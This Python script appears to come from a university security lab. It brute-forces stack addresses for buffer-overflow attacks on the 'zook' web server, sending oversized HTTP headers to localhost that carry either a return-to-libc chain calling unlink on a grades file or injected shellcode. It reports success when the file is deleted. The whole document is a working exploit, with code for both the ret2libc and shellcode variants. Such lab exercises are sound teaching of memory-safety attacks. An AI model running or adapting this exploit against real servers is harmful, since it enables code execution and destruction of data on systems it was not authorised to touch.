#!/usr/bin/python
"""Brute-force stack_saved_ebp for header-overflow exploits (ex3/ex4)."""
import socket, struct, time, os, subprocess, sys

LIBC_UNLINK = 0x40a563b0
PAD = 536

def cleanup():
    os.system("killall -9 zookld zookd zookfs zookd-exstack zookfs-exstack 2>/dev/null || true")
    time.sleep(0.3)

def try_ex4b(ebp):
    cleanup()
    open("/home/httpd/grades.txt", "w").close()
    subprocess.Popen(["./clean-env.sh", "./zookld", "zook.conf"],
                     stdout=open("/dev/null", "w"), stderr=open("/dev/null", "w"))
    time.sleep(1)
    stack_retaddr = ebp + 4
    param = ebp + 16
    tail = struct.pack("<I", LIBC_UNLINK & 0xffffffff)
    tail += "AAAA"
    tail += struct.pack("<I", param & 0xffffffff)
    tail += "/home/httpd/grades.txt"
    msg = "A" * PAD + tail
    req = "GET / HTTP/1.0\r\nexploit: " + msg + "\r\n\r\n"
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect(("localhost", 8080))
        s.send(req)
        s.close()
    except Exception:
        pass
    time.sleep(0.5)
    ok = not os.path.exists("/home/httpd/grades.txt")
    cleanup()
    return ok

def try_ex3(ebp, shellcode):
    cleanup()
    open("/home/httpd/grades.txt", "w").close()
    subprocess.Popen(["./clean-env.sh", "./zookld", "zook-exstack.conf"],
                     stdout=open("/dev/null", "w"), stderr=open("/dev/null", "w"))
    time.sleep(1)
    retto = struct.pack("<I", (ebp + 8) & 0xffffffff)
    msg = "A" * PAD + retto + shellcode
    req = "GET / HTTP/1.0\r\nexploit: " + msg + "\r\n\r\n"
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect(("localhost", 8080))
        s.send(req)
        s.close()
    except Exception:
        pass
    time.sleep(0.5)
    ok = not os.path.exists("/home/httpd/grades.txt")
    cleanup()
    return ok

if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "ex4b"
    shellcode = open("shellcode.bin").read() if mode == "ex3" else ""
    fn = try_ex3 if mode == "ex3" else try_ex4b

    for ebp in xrange(0xbfffc000, 0xbffff000, 0x10):
        if fn(ebp, shellcode) if mode == "ex3" else fn(ebp):
            print("SUCCESS ebp=%#x" % ebp)
            sys.exit(0)
    print("FAILED")
